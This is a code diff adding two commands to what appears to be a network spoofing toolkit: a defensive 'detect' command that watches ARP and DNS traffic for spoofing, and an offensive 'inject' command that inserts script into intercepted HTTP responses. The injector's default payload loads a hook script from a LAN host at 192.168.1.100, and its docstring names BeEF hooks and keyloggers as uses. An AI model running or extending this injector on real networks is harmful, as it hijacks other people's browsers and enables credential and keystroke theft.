@@ -610,6 +610,99 @@ def dashboard_web(
 
 
 @app.command()
+def detect(
+    interface: Optional[str] = typer.Option(
+        None, "--interface", "-i", help="network interface",
+    ),
+    export: Optional[str] = typer.Option(
+        None, "--export", help="export alerts to json file",
+    ),
+):
+    """detect arp/dns spoofing on the network"""
+    from spoof.detector import SpoofDetector
+
+    platform = get_platform()
+    iface = interface or platform.get_default_interface()
+    if not iface:
+        console.print("[red]no interface specified[/red]")
+        raise typer.Exit(1)
+
+    render_banner(console)
+    detector = SpoofDetector(interface=iface)
+    detector.start()
+
+    console.print(Panel(
+        f"[bold cyan]spoof detector active[/bold cyan] on [green]{iface}[/green]\n"
+        "[dim]monitoring ARP + DNS traffic for anomalies[/dim]",
+        border_style="cyan",
+    ))
+
+    try:
+        import time
+        while True:
+            time.sleep(5)
+            if detector.alerts:
+                detector.display_alerts(console)
+    except KeyboardInterrupt:
+        console.print("\n[yellow]stopping...[/yellow]")
+        detector.stop()
+        detector.display_alerts(console)
+        if export:
+            detector.export_alerts(export)
+            console.print(f"[green]alerts exported:[/green] {export}")
+
+
+@app.command()
+def inject(
+    interface: Optional[str] = typer.Option(
+        None, "--interface", "-i", help="network interface",
+    ),
+    code: str = typer.Option(
+        '<script src="http://192.168.1.100:3000/hook.js"></script>',
+        "--code", "-c", help="javascript/html code to inject",
+    ),
+    mode: str = typer.Option(
+        "scapy", "--mode", "-m", help="injection mode: scapy (cross-platform) or nfqueue (linux only)",
+    ),
+    inject_pos: str = typer.Option(
+        "append", "--position", "-p", help="injection position: append (</body>), head (</head>), prepend",
+    ),
+):
+    """inject code into http responses (js hooks, beef, keylogger)"""
+    from spoof.injector import create_injector
+
+    platform = get_platform()
+    iface = interface or platform.get_default_interface()
+    if not iface:
+        console.print("[red]no interface specified[/red]")
+        raise typer.Exit(1)
+
+    render_banner(console)
+    injector = create_injector(
+        mode=mode, interface=iface,
+        injection_code=code, injection_mode=inject_pos,
+    )
+    injector.start()
+
+    console.print(Panel(
+        f"[bold green]code injector active[/bold green] on [cyan]{iface}[/cyan]\n"
+        f"[dim]mode: {mode} | position: {inject_pos}[/dim]\n"
+        f"[dim]payload ({len(code)}B):[/dim] {code[:80]}{'...' if len(code) > 80 else ''}",
+        border_style="green",
+    ))
+
+    try:
+        import time
+        while True:
+            time.sleep(5)
+            s = injector.stats
+            console.print(f"[dim]injected: {s['injected']} | scanned: {s['scanned']} | skipped: {s['skipped']}[/dim]")
+    except KeyboardInterrupt:
+        console.print("\n[yellow]stopping...[/yellow]")
+        injector.stop()
+
+
+@app.command()
 def version():
     """show version information"""
     render_banner(console)
